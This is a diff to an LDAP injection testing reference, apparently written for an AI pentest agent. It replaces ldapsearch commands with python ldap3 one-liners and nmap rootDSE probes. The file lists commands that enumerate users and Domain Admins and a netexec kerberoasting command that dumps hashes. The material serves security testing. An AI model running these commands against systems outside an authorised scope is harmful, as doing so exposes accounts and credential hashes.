@@ -14,7 +14,7 @@ Reference for testing LDAP injection in identity systems (login forms, search pa
 | Action | Tool | Notes |
 |---|---|---|
 | HTTP probes against the front-end | `execute_curl` | Always capture status, body length, and error text. |
-| Direct LDAP queries to a reachable server | `kali_shell ldapsearch` | `ldapsearch -x -H ldap://target.tld -b "<base_dn>" "<filter>"`. |
+| Direct LDAP queries to a reachable server | `kali_shell` (python3 + `ldap3`) | `python3 -c "import ldap3; c=ldap3.Connection('ldap://target.tld', auto_bind=True); c.search('<base_dn>', '<filter>'); print(c.entries)"`. |
 | LDAP bind / authenticated dumps | `kali_shell netexec` | `nxc ldap target.tld -u user -p pass --users --groups`. |
 | Multi-step probes / programmatic | `execute_code` | `ldap3` Python lib (already useful via `requests`/`pwntools` companions). |
 
@@ -64,11 +64,10 @@ The metacharacters are: `* ( ) \ NUL`. Any input flowing into a filter without e
 | `ipaUserAuthType`, `ipaSshPubKey` | FreeIPA |
 | `nsRoleDN`, `passwordExpirationTime` | 389-DS |
 
-When `ldapsearch` is reachable, banner-grab via:
+When the LDAP port is reachable, banner-grab the rootDSE via:
 
 ```
-kali_shell: ldapsearch -x -H ldap://target.tld -s base -b "" "(objectClass=*)"
-kali_shell: ldapsearch -x -H ldap://target.tld -b "" -s base "(objectClass=*)" namingContexts
+execute_nmap: -p 389,636 --script ldap-rootdse target.tld
 ```
 
 Returned `namingContexts` reveal the search base DNs.
@@ -202,9 +201,9 @@ while True:
 ## Tool reference
 
 ```
-kali_shell: ldapsearch -x -H ldap://target.tld -b "dc=target,dc=tld" "(uid=*)" cn mail
-kali_shell: ldapsearch -x -H ldaps://target.tld:636 -b "dc=target,dc=tld" "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=target,DC=tld))" sAMAccountName
-kali_shell: ldapsearch -x -H ldap://target.tld -D "uid=alice,ou=people,dc=target,dc=tld" -w 'pass' -b "" "(objectClass=*)" supportedControl
+kali_shell: python3 -c "import ldap3; c=ldap3.Connection('ldap://target.tld', auto_bind=True); c.search('dc=target,dc=tld', '(uid=*)', attributes=['cn','mail']); print(c.entries)"
+kali_shell: python3 -c "import ldap3; c=ldap3.Connection('ldaps://target.tld:636', auto_bind=True); c.search('dc=target,dc=tld', '(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=target,DC=tld))', attributes=['sAMAccountName']); print(c.entries)"
+kali_shell: python3 -c "import ldap3; c=ldap3.Connection('ldap://target.tld', user='uid=alice,ou=people,dc=target,dc=tld', password='pass', auto_bind=True); c.search('', '(objectClass=*)', search_scope=ldap3.BASE, attributes=['supportedControl']); print(c.entries)"
 kali_shell: nxc ldap target.tld -u alice -p pass --users
 kali_shell: nxc ldap target.tld -u alice -p pass --groups
 kali_shell: nxc ldap target.tld -u alice -p pass --kerberoasting /tmp/kerb.hash
